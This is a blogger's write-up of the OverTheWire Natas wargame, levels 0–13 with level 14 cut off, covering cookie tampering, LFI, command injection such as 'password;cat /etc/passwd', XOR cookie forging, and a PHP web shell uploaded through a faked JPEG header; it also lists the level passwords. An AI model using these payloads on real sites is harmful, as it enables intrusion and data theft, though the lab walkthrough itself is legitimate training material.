I will be solving the Natas Labs from OverTheWire. OverTheWire is a platform that can help you learn and practice security concepts in the form of fun-filled games.

PS: As I keep solving the labs, I'll be adding them to this writeup

Lets get started


# Level 0

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8db0502f-7e0c-4055-a754-7b15db9a8598)

Navigating to the webpage using the username and password provided

username:```natas0```          password:```natas0```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3acaf2bd-157c-4580-808b-e075e98350e4)

Viewing the source page,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/49879ba8-ec1e-4bcb-80c5-88f7b6065111)

We found the password for the next level.



# Level 1

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7f3c6dac-8014-4e32-a44e-c8c83a746ca0)

Navigating to the webpage and using the password we got from the previous level

username:```natas1```            password:```g9D9cREhslqBKtcA2uocGHPfMZVzeFK6```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/722e7670-42e3-478f-be2d-35bae9a46d80)

Right-clicking has been blocked, this means we can't right-click on the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9dbb3f81-a213-4381-a495-83092c4ba523)

To view the source page, you can use ```ctrl + u``` 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58bdebd5-4fc0-45d5-af47-86bb6221c9d7)

cool, we found the password to the next level😎



# Level 2

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a4593d92-45be-463b-9d0f-66c4018cba35)

Navigating to the webpage and using the password we got from the previous level

username:```natas2```                password:```h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e3d6602e-5b49-4b91-9d25-b9751903c9fb)

Checking the source page,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6a392a9b-209f-461e-9628-6b1e601a4831)

 From the above screenshot, you see this ```<img src="files/pixel.png">```.

This is a png image, this means the image is located in the url ```http://natas2.natas.labs.overthewire.org/files/pixel.png```, what if we were to go back a directory, we would then have ```http://natas2.natas.labs.overthewire.org/files```. Navigating to the webpage, you have this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2c0cc6d8-6224-4e06-a1d1-c9bcc114b1f9)

Viewing the ```users.txt``` file,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5f11fc2a-92c5-4a0f-86f1-e176b2286748)

We have the password for the next level.



# Level 3

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0c6847f0-a5db-46a3-95df-40ccd09a327e)

Navigating to the webpage and using the password we got from the previous level

username:```natas3```        password:```G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b375b0b-ff94-45d7-bf95-4267fbceb35a)

Viewing the source page,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/431bf817-d077-4be5-96b8-46a4c9863a0d)

Now that was a bold statement😂.

Well, navigating to the ```/robots.txt``` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/74a98d89-ec44-41f5-b134-8e366b0979df)

Navigating to the ```/s3cr3t/``` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9b60e187-76a5-4441-a4b4-180d9b093c00)

Lets check out the ```users.txt``` file.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/159b1194-5fef-4980-839c-b232717226af)

cool, we got the password for the next level.



# Level 4

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a81cdd7a-1cba-47f9-b407-dd34b3fc70b8)

Navigating to the webpage and using the password we got from the previous level

username:```natas4```            password:```tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9b1d174f-9d29-420c-871b-6a1e26d58087)

To access the website successfully, we need to ensure that you are visiting it from the specified URL.

To do this, we'll try to modify our request to include the correct source url.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e5b9515-9c6c-46de-8d4f-c3bc36b283b6)

We'll be using the "Referer" header here

<font color="green">The Referer header in an HTTP request provides information about the URL of the previous webpage that linked to the current page. It helps websites and servers track the origin of incoming traffic and understand how users navigate through different webpages.</font>

Modifying our request,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/374c7456-fc44-437c-92c1-fc2b4d008bbf)

Cool, we found the passowrd for the next level.



# Level 5

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2e3413fc-d301-45c8-9d61-59fdcd26954d)

Navigating to the webpage and using the password we found in the previous level

username:```natas5```          password:```Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4eb4c242-7337-4751-b27c-5c6b61b36d43)

It is saying here that we are not logged in. Lets capture the request using burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb0e5685-de9f-483a-b023-ff9d83baee42)

Looking at the captured request again;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b62aa7a9-8a8e-4de2-bc4e-87f25e55286b)

For the cookie header, you see that ```loggedin``` has a value of ```0```. 

What happens when we change that value to ```1```??

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/efa40c80-31b3-44bc-a5e4-d3e4dd747084)

cool, we got the password for the next level😎



# Level 6

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f149d3fc-8764-4fbf-89ef-747cb403047e)

Navigating to the webpage and using the password we found in the previous level

username:```natas6```        password:```fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/67486b51-ad4c-4d7a-a814-499b3373467c)

We are asked to provide a secret.

Well, let me try this secret, be sure not to tell anybody hehe. **_I am spiderman_**, inputting that secret

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28b5e367-891a-4d3d-9814-f33b9a084a37)

As you can see we got an error message.

Viewing the source page;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40147890-6d1a-4e77-af75-b130580eddf6)

We got this php code

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
Explaining the code
```
1.It includes the contents of the file "includes/secret.inc" using the include statement. This allows the code to access variables or functions defined in that file.
2.It checks if the "submit" key exists in the $_POST superglobal array, indicating that a form has been submitted via the HTTP POST method.
3.If the "submit" key exists, it compares the value of the $secret variable with the value of the 'secret' field submitted through the form ($_POST['secret']).
4.If the values match, it prints the message "Access granted. The password for natas7 is <censored>". This suggests that upon successful submission of the correct secret, it reveals the password for the "natas7" user.
5.If the values do not match, it prints the message "Wrong secret", indicating that the submitted secret is incorrect.
```
Now, lets navigate to the directory ```/includes/secret.inc```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b77b9b19-8ebe-4d67-b153-a71cf7d4c413)

oops, a blank page😰

Viweing the page source;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/257b747b-0c4f-468a-b99b-093734846546)

We found our secret hehe, submitting the secret should get us the password for the next level

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d6d51558-b97f-42a4-bad0-62418c6c5460)

Cool, we found the password for the next level



# Level 7

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2f3c4572-4128-47cc-857d-d5c4cba090f9)

Navigating to the webpage and using the password we got from the previous level

username:```natas7```          password:```jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1e0fd5cf-de9a-40e8-b6c6-9e4afe847a8c)

Viewing the page source;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50880754-c635-44cf-bf38-88d2b9ade22d)

We got a hint saying the password for the next level is in ```etc/natas_webpass/natas8```

Going back to the webpage and clicking on ```Home```,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/aae0a694-6f55-4a0a-9c87-0cf3b93bf9e2)

From the url we can tell that there's a possible LFI (Local File Inclusion) vulnerability, which can enable us to read files.

Lets try to read the ```/etc/passwd``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/963582a6-bd83-45f4-a2c4-b5ffae665de9)

cool stuff😎

Now, using the hint they gave us earlier, lets get the  password for the next level

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7765c1c9-9a77-42da-8c42-9bf1998ab648)

Nice, we got the password for the next level



# Level 8

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e48f580b-f5cc-440b-8ddd-153c0090fc1d)

Navigating to the webpage and using the password we got from the previous level

username:```natas8```          password:```a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/da44f7dc-dd4b-4b3c-9ede-b4ce3f3fd07d)

Viewing the source page I got this php code

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
Explaining the code
```
1. The encoded secret is stored in the variable $encodedSecret. It is a hexadecimal representation of the original secret.
2. The function encodeSecret($secret) is defined. This function takes a secret as input, performs three operations on it, and returns the result.
   a. The secret is base64 encoded using base64_encode($secret).
   b. The resulting base64 string is reversed using strrev().
   c. The reversed string is converted to its hexadecimal representation using bin2hex().
3. The code checks whether the form has been submitted (array_key_exists("submit", $_POST)). It assumes that there is an HTML form with an input field named "secret" and a submit button.
4. If the form has been submitted, the code compares the encoded secret generated from the submitted secret with the original encoded secret (encodeSecret($_POST['secret']) == $encodedSecret).
5. If the comparison is true, it prints the message "Access granted. The password for natas9 is <censored>," where <censored> indicates that the password is intentionally hidden.
6. If the comparison is false, it prints the message "Wrong secret."
```
Taking the encodedsecret ```3d3d516343746d4d6d6c315669563362```, since it is hex encoded, lets decode it using [cyberchef](https://gchq.github.io/CyberChef/)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/19a19f4b-dcd1-47c0-b03c-413e4cf5a7c9)

Now, we'll try to use the ```strrev()``` function to reverse the base64 we got. For this we'll use a python script

```python
import base64

def reverse_base64(encoded_base64):

    # Step 1: Reverse the decoded bytes
    reversed_bytes = encoded_base64[::-1]

    # Step 2: Decode the Base64 string
    decoded_bytes = base64.b64decode(reversed_bytes)

    # Step 3: Encode the reversed bytes back to Base64
    reversed_base64 = base64.b64encode(decoded_bytes).decode()

    return reversed_base64

# Example usage
encoded_base64 = "==QcCtmMml1ViV3b"
reversed_base64 = reverse_base64(encoded_base64)
print(reversed_base64)
```
After running the script, you should get this

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ python abeg.py
b3ViV1lmMmtCcQ==
```
Now, lets go ahead and decode this base64

command:```echo "b3ViV1lmMmtCcQ==" | base64 -d```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ echo "b3ViV1lmMmtCcQ==" | base64 -d
oubWYf2kBq
```
Applying the output we got as the secret, that is ```oubWYf2kBq```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1aacba88-da8a-4f30-874d-74db1c62769f)

Cool, we got the password for the next level



# Level 9

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/72ae6eda-8264-4dff-be2c-244a40c8b5e9)

Navigating to the webpage and using the password we got from the previous level

username:```natas9```       password:```Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b3047805-b9f7-4bb3-ab45-52475b05243f)

Viewing the source code we get this php code

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
Explaining this code
```
1. The script initializes an empty variable named $key.
2. It checks if the "needle" parameter exists in the request using array_key_exists("needle", $_REQUEST).
3. If the "needle" parameter is found, its value is assigned to the $key variable.
4. The script checks if $key is not an empty string.
5. If $key is not empty, it executes a shell command using passthru().
6. The shell command being executed is grep -i $key dictionary.txt, which searches for the value of $key (case-insensitive) in the file named "dictionary.txt".
7. If there are any matches found in the dictionary file, the results will be displayed as the output.
```
So, this basically executes our commands for us. Lets find the word "password"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/45f277e1-4341-41a1-9dde-1824a925fef5)

Now, this looks like a possible command injection vulnerability where you can pass other commands.

For example, to read the ```/etc/passwd``` file, we can use this ```password;cat/etc/passwd```, so what happens here is that the shell interprets the command as 2 separate commands, ```grep -i password``` and ```cat /etc/passwd```. The ```grep``` searches for the word password in the dictionary.txt file, while the ```cat``` command displays the content of the ```/etc/passwd``` file.

Trying it out;

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3d22c56b-9740-45a1-a1bc-43ba84cc3548)

It worked, now lets try to read the password for the next level from ```/etc/natas_webpass/natas10```

command:```password;cat /etc/natas_webpass/natas10```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3734ca46-daef-4bfc-bd5d-4f626b8922f4)

Cool, we got the password for the next level.



# Level 10

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2cce50b3-5aec-4d8e-aa66-0e71e891a778)

Navigating to the webpage and using the password we got from the previous level

username:```natas10```        password:```D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9c47a48b-ccc2-4ba2-82cf-4e812d0a7010)

oops, they now filter characters which means it won't accept the input it did earlier.

Viewing the source code I got this php code;

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
This code is similar to the code from the previous level just that this one is more secured. It filters out special characters ```;```,```|``` or ```&```, which means we can't use it.

Now, all hope is not lost hehe😎.

Since, this filters out special characters we can go ahead to use a string

For example,to read the ```/etc/passwd``` file, we can try somthing like this ```B /etc/passwd```, what this does is that it runs the command as this ```grep -i B /etc/passwd dictionary.txt```, this command attempts to search for the string "B", in both the ```/etc/passwd``` file and the ```dictionary.txt```. You should know that if the string ```B``` isn't in the ```/etc/passwd``` file, it won't show the output. So it is more like a trial and error stuff, that is, trying the letters till you get an output

Lets try it out

command:```B /etc/passwd```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a7d1d9cc-67ad-4621-943e-6d2012e6f4ed)

It worked, now we can use this to read the password to use for the next level

command:```A /etc/natas_webpass/natas11```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/adf09225-b3b5-412e-987b-32b08cddec74)

Cool, we got the password for the next level.



# Level 11

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d628a915-6be4-481c-b2e1-22baa64b3b6a)

Navigating to the webpage and making use of the password we found in the previous level

username:```natas11```     password:```1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dd87656-2987-4672-acf4-961e82b51932)

Viewing the source code we get this php code

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

```
Explaining the code
```
1. Default values for "showpassword" and "bgcolor" are defined in an array.
2. XOR encryption function is implemented.
3. Data is loaded from a cookie, decrypted, and validated.
4. Data is saved by encrypting and encoding it as a cookie.
5. The script loads data, either from the cookie or using default values.
6. If a valid "bgcolor" is provided in the request, it updates the data.
7. The updated data is saved as a cookie.
```
Also
```php
?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```
Explaining this code also
```
1. The code sets the background color of the page based on the $data['bgcolor'] value.
2. It mentions that cookies are protected with XOR encryption.
3. If $data["showpassword"] is "yes", it prints a censored message about the password for the next level (natas12).
```
Lets first get the cookie, inspecting element

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4462b2b1-59af-4b51-8348-262cd645ffb5)

So, that's our cookie ```MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D```, Url Decoding this using [cyberchef](https://gchq.github.io/CyberChef/) should result in a base64 encoding

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ea4eb80b-b742-4202-9496-4b9601610421)

Cool, we got our cookie which is ```MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=```. The next thing to do now is get the key

To get the key, we'll be using this php script

```php
<?php  

function xor_encrypt($in) {  
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}

$cookie="MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=";  
  
echo xor_encrypt(base64_decode($cookie));  
  
?>
```
This script  takes a base64-encoded string ($cookie), decrypts it using XOR encryption with a predefined key, and then outputs the decrypted result

To run the script

command:```php -f key.php```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ php -f key.php   
KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK
```
cool, we got our key which is ```KNHL```. What we'll do now is try to generate a new cookie using this key we got, during the explanation of the php codes we saw that if ```showpassword``` is set to ```yes``` then we'll get the password to the next level printed out.

To generate a new cookie we'll use this php script

```php
 <?php  
  
function xor_encrypt($in) {  
    $key = 'KNHL';  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}  
  
$data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");  
  
echo base64_encode(xor_encrypt(json_encode($data)));  
  
?>  
```
The script encrypts a JSON-encoded string ($data) using XOR encryption with the key "KNHL". It then base64-encodes the encrypted result and outputs the encoded string.

To run the script

command:```php -f cookie.php```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ php -f cookie.php
MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
```
We got a new cookie, replacing the previous cookie with this new generated one should get us the password to the next level

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/debc93dc-f596-40f5-9c95-8bd28a0cca67)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/29014e94-34ca-4165-9c53-5be04e99b8a9)

Cool, we got the password to the next level



# Level 12

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c207c032-ec6c-4552-963a-d348a1199da8)

Navigate to the webpage using the password we got from the previous level

username:```natas12```        password:```YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f5ed8743-ff02-432d-b5a4-bee40815e1ef)

Viewing the source code we get this php code

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
Explaining the code
```
1. Function genRandomString generates a random string of length 10.
2. Function makeRandomPath creates a unique random file path in a given directory with a specified extension.
3. Function makeRandomPathFromFilename generates a random file path based on a given directory and filename.
4. If the "filename" key exists in the form data:
   a. Generate a random file path using makeRandomPathFromFilename.
   b. Check if the uploaded file size exceeds 1000 bytes.
   c. If the file size is within limits, move the uploaded file to the target path.
   d. Display appropriate messages based on the success or failure of the file upload.
5. If the "filename" key doesn't exist, assume no file upload form was submitted.
```
I think we got ourselves here a file upload vulnerability

We'll try uploading a ```.php``` file, since they aren't always up to ```1kb```.

Save this payload ```<?php system($_GET['cmd']); ?>``` in a php file

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ nano abeg.php
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ cat abeg.php 
<?php system($_GET['cmd']); ?>
```
Lets try to upload this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e136f209-b15f-4a49-a656-9e40bde10ba6)

As you can see from the above screenshot, we uploaded a file named ```abeg.php```, it got renamed and also got the extension changed to a ```.jpg``` extension.

Lets try to upload the same file again, but this time, we'll intercept using burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35408984-bdcd-491e-9ece-705399f1b335)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07702db3-5f55-4fc8-b069-257427bfe802)

Lets modify this request by changing the ```.jpg``` extension to ```.php```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed4e8f47-0209-4225-a30b-f1469261f08a)

Now, forward the request

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d64a1371-de16-4a0a-a6ef-d449c4ac395b)

Cool, now lets view our payload

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b8162cfc-6180-4782-9f65-88fd2d171467)

Nice, we can get command injection through this by adding ```?cmd=id``` to the back of the url

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bfe81896-f2d4-459f-a6ac-cc68e8e00662)

Now, lets get the password to the next level, this can be found at ```/etc/natas_webpass/natas13```. To read the password add ```?cmd=cat /etc/natas_webpass/natas13``` at the back of the url

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e517f641-09f9-45a9-b883-0eef32f0a2d7)

Cool. we got the password to the next level😎



# Level 13

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2917b03e-85cb-4f3f-aad6-f1dafa875268)

Navigating to the webpage and using the password we found from the previous level

username:```natas13```         password:```lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/badd1d2b-25ff-4f7c-9f4d-a06f6d0a80a0)

Viewing the source code we get this php script

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
This code is similar to that of previous level, the difference is that only image files are accepted in this level. This means it won't accept a ```.php``` extension file as it did in the previous level.

We can still find our way around it, right?? That's why we are h4x0rs hehe😎

Doing some research I found this [page](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454). 

We can use something as simple as this ```AAAA<?php system($_GET['cmd']); ?>``` to bypass restrictions. Save this in a ```.php``` file

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ gedit bankai.php
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ cat bankai.php
AAAA<?php system($_GET['cmd']); ?>
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ file bankai.php
bankai.php: ASCII text
```
Now, we'll be using a tool called ```hexeditor``` to change the header of ```bankai.php``` to that of a ```.jpeg``` header.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fca6e19a-dc00-46c1-b12a-6b64962595fb)

From the above screenshot, you can see that the ```AAAA``` has the header ```41 41 41 41```, we'll be changing the header to that of a ```.jpeg file```. Checking it up online I got this ```FF D8 FF EE```. So, let’s change the header to that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b60d0cdc-7124-4dc2-bd3e-1241e7e47fe6)

Now that we have changed the header, lets save it and exit (hit ctrl +x, then hit the enter button to exit).

Lets check the file type again

command:```file bankai.php```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ hexeditor bankai.php
                                                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/CTF/over_the_wire]
└─$ file bankai.php 
bankai.php: JPEG image data
```
Cool, we were able to change the headers. This means we can go ahead to upload this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0d994047-11ab-47e4-b5e5-cb1074aebebf)

Just as we did in the previous level, we'll be using burpsuite to modify the file extension from ```.jpg``` to ```.php```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2c4875c-a9db-49ba-88d7-f0f06feb3412)

Forward the request,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/745fdc2e-ffa6-4c4e-b5f3-e82e3b046c3f)

Nice, now lets view our payload

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/666e4d53-9595-450c-b4ec-4b85fd542ed5)

Nice, we can get command injection through this by adding ```?cmd=id``` to the back of the url

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4a8ed081-9715-441a-9ef4-ea9b900215bc)

Now, lets get the password to the next level, this can be found at ```/etc/natas_webpass/natas14```. To read the password add ```?cmd=cat /etc/natas_webpass/natas14``` at the back of the url

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90579867-a071-4912-8920-3d04f5bdc14d)

Cool, we got the password to the next level



# Level 14

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5ac3d05-2096-4d2a-aab9-d7ebbb7bfabb)

Navigating to the webpage and using the password we got from the previous level

username:```natas14```       password:```qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/230b7db8-f55b-4cee-9398-64b4260c2da8)

Checking the source code, we find this php script

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

